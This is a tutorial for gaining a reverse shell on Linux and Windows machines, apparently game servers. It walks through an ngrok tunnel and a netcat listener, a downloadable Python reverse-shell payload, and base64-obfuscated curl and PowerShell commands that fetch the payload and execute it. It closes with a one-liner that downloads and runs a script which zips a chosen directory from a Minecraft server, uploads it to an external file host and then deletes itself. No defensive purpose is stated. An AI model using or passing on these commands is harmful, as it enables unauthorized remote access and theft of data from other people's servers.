# Python Reverse Shell Tutorial (Linux and Windows)
### UPDATE: I made a Windows batch script that does it all automatically, from installing Python, to compiling the code and uploading, it's all user-friendly: [0137b23d50.zip](https://catlitter.minoa.cat/api/view/0137b23d50.zip)
###

## On Your Own Computer
you will need [Python](https://www.python.org/downloads/), [Netcat](https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip), & [Ngrok](https://ngrok.com)
1. **Get Netcat**  
   - For Windows: [Download Netcat](https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip)  
   - For Linux or macOS: Find and install the appropriate files for your OS.

2. **Get Ngrok and Set Up**  
   - [Download and setup Ngrok](https://ngrok.com)

3. **Start Ngrok**  
`ngrok tcp 4444`


4. **Start Netcat**  
`nc -lvp 4444`


5. **Download and Edit Python File**
   - [Download the Python script n compiler](https://catlitter.minoa.cat/api/view/fafc8a7461.zip) and in rs.py edit the IP and port to be the Ngrok one.
   - (Must have python installed) run windows compile.bat and only if you have wsl setup you can run linux compile.bat and the files that show up are compilex executables.
   - Upload the compiled files to [anontransfer.com](https://anontransfer.com/)!
   - Once finished uploading goto the download url, click download, then go into your downlaod manager and copy the direct download link.

6. **Convert URL to Base64**
   - Use [base64encode.org](https://www.base64encode.org/) to convert the URL for whatever file to Base64.

## In Game (run under the shell command)
7. **Copy and Paste the Command into your Terminal**
   - While in, use the command below, replacing `{BASE64 GOES HERE}` with the Base64 link:
Linux:
`curl -O $(echo "{BASE64 GOES HERE}" | base64 --decode)`
###
Windows:
`powershell -Command "Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{BASE64 GOES HERE}'))) -OutFile ([System.IO.Path]::GetFileName(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{BASE64 GOES HERE}')))))"`

###

8. **Run the File**
Linux:
`chmod +x {FILENAME}`
 `./{FILENAME}`
Windows:
`start {FILENAME}`
 - If there are errors, idk..


# more
## Linux mc server file stealer
```
bash -c 'curl -o steal.sh $(echo "aHR0cHM6Ly9jYXRsaXR0ZXIubWlub2EuY2F0L2FwaS92aWV3L2FkMGI1MTJhNzZiNTBjODhlY2VmLnNo" | base64 --decode) && chmod +x steal.sh && bash ./steal.sh && rm -- steal.sh'
```
*(downloads and runs [this script](https://catlitter.minoa.cat/api/view/ad0b512a76b50c88ecef.sh) that zips and uploads whatever dir you enter to gofile and gives you the link only on linux)*
